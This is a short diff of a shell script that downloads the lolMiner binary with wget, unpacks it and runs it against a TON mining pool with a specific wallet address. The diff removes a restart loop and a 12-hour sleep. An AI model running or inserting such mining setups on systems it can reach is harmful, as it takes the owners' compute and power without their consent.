@@ -7,8 +7,4 @@ sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -
 sudo apt install libpci3
 sudo apt-get install screen
 wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz -O - | tar -xz
-while [ 1 ]; do
-sleep 5
 ./1.42/lolMiner -a TON -p https://next.ton-pool.com -u EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi --apiport 4444
-done
-sleep 43200
